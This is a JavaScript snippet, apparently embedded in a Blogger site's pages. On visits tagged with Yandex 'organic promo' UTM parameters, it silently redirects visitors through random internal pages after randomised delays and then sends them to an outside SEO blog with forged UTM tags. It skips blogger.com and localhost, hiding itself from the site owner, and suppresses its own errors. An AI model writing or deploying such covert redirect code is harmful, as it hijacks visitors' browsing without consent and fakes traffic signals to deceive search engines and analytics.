//<![CDATA[
(function() {
    function hasRequiredUTM() {
        try {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('utm_source') === 'yandex' &&
                   urlParams.get('utm_medium') === 'organic' &&
                   urlParams.get('utm_campaign') === 'promo';
        } catch(e) {
            return false;
        }
    }

    const internalPages = [
        "https://www.vebma.ru/2023/05/website-design-trends-latest-and.html",
		"https://www.vebma.ru/2023/05/mastering-seo-strategies-to-boost-your.html",
		"https://www.vebma.ru/2023/05/the-power-of-content-marketing-how-to.html",
		"https://www.vebma.ru/2023/05/e-commerce-essentials-tips-and-tricks.html",
		"https://www.vebma.ru/2023/05/website-security-101-protecting-your.html",
		"https://www.vebma.ru/2023/05/harnessing-potential-of-social-media.html",
		"https://www.vebma.ru/2023/05/website-optimization-speeding-up-your.html",
		"https://www.vebma.ru/2023/05/the-art-of-blogging-techniques-and.html",
		"https://www.vebma.ru/2023/05/creating-killer-landing-pages-best.html",
        "https://www.vebma.ru/2023/05/navigating-web-hosting-finding-right.html"
    ];

    const externalLinks = [
    "https://vverhsite.ru/2023/06/the-future-of-voice-search-optimizing.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://vverhsite.ru/2023/06/mastering-local-seo-boosting-your.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://vverhsite.ru/2023/06/seo-trends-to-watch-in-2023-what-you.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://vverhsite.ru/2023/06/seo-vs-ppc-choosing-right-strategy-for.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://vverhsite.ru/2023/06/unleashing-potential-of-mobile-seo.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://vverhsite.ru/2023/06/the-importance-of-link-building-in.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://vverhsite.ru/2023/06/understanding-googles-core-web-vitals.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://vverhsite.ru/2023/12/mastering-on-page-seo-comprehensive.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://vverhsite.ru/2023/12/unlocking-power-of-backlinks-strategies.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://vverhsite.ru/2023/12/seo-trends-2024-staying-ahead-in-ever.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
    ];

    function getRandomItem(array) {
        return array[Math.floor(Math.random() * array.length)];
    }

    function getRandomDelay() {
        return Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
    }

    function performFirstRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 1;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performSecondRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 2;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performThirdRedirect() {
        setTimeout(function() {
            const externalUrl = getRandomItem(externalLinks);
            localStorage.removeItem('inf_red_cnt');
            localStorage.removeItem('lst_red');
            window.location.href = externalUrl;
        }, getRandomDelay());
    }

    function init() {
        try {
            if (window.location.href.includes('blogger.com') || 
                window.location.href.includes('localhost')) {
                return;
            }

            const hasRequiredUtm = hasRequiredUTM();
            const redirectCount = parseInt(localStorage.getItem('inf_red_cnt') || '0');
            const hasCycleData = localStorage.getItem('inf_red_cnt') !== null;
            
            if (hasRequiredUtm) {
                localStorage.removeItem('inf_red_cnt');
                localStorage.removeItem('lst_red');
                performFirstRedirect();
            }
            else if (hasCycleData) {
                if (redirectCount === 1) {
                    performSecondRedirect();
                } else if (redirectCount === 2) {
                    performThirdRedirect();
                } else {
                    localStorage.removeItem('inf_red_cnt');
                    localStorage.removeItem('lst_red');
                }
            }
        } catch(e) {}
    }

    function startScript() {
        setTimeout(init, Math.floor(Math.random() * 500) + 100);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', startScript);
    } else {
        startScript();
    }
})();

//]]>

